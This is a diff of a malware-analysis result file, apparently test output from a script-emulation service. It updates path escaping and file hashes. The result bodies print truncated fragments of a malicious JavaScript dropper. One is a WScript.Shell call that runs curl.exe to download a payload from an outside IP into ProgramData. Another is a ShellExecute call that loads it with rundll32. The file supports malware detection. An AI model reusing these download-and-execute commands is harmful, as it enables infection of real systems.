@@ -105,7 +105,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs dropped executable\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tWScript.Shell[18].Run(curl.exe --output C:\\x05&\\x05&ProgramData\\x05&\\x05&index1.png --url http://139...",
+        "body": "JavaScript runs dropped executable\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tWScript.Shell[18].Run(curl.exe --output C:\\ProgramData\\index1.png --url http://139.99.117.17/68597.d...",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -127,7 +127,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs code via shell\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tWScript.Shell[18].Run(curl.exe --output C:\\x05&\\x05&ProgramData\\x05&\\x05&index1.png --url http://139...",
+        "body": "JavaScript runs code via shell\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tWScript.Shell[18].Run(curl.exe --output C:\\ProgramData\\index1.png --url http://139.99.117.17/68597.d...",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -149,7 +149,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs code via shell application\n\t\tShell.Application[19].ShellExecute(rundll32,C:?&?&ProgramData?&?&index1.png,Wind,,open,3)\n",
+        "body": "JavaScript runs code via shell application\n\t\tShell.Application[19].ShellExecute(rundll32,C:\\ProgramData\\index1.png,Wind,,open,3)\n",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -262,13 +262,13 @@
     "extracted": [
       {
         "name": "extracted_wscript.bat",
-        "sha256": "7a48fed6a0666325c9ba60c41d65c6688c443c00fa942334e6e4c37c1f14214a"
+        "sha256": "4bfafbb9be2fecdbcc1210afd08223e8da7b9e0baaf2fd472a077e4697f885ac"
       }
     ],
     "supplementary": [
       {
         "name": "temp_javascript.js",
-        "sha256": "16985223a2bb70f79ff99b0ecdfa30c890d9af75a493ca51b824127c5ca589eb"
+        "sha256": "e0de6fa9fd78f1036d9b02caa0eb70bdbc0e3c030e1f4b8aceb2700b8b5f0d7b"
       }
     ]
   },
